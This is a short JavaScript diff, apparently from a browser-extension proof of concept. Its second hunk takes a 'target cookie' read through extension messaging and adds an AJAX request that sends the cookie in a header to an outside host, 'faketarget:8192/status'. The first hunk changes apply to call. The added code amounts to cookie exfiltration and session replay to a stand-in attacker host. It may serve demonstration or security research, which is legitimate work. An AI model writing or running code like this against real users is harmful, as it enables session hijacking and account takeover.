@@ -19,7 +19,7 @@ window.addEventListener("PassToPage", function(evt) {
       detail.callbackKey = undefined;
       if (callback) {
         callbackRegistry[detail.callbackKey] = undefined;
-        callback.apply(null, detail);
+        callback.call(null, detail);
       }
     }
   }
@@ -43,6 +43,11 @@ var message = {
   callback: function(response) {
     var cookieText = response.cookieName + '=' + response.cookieValue;
     $('#target-cookie').text('target cookie: ' + cookieText);
+    
+    $.ajax({url: 'http://faketarget:8192/status',
+      headers: {cookie: cookieText}, success: function(data, status, xhr) {
+        alert(data);
+    }});
   },
 };
 passToBackground(message);
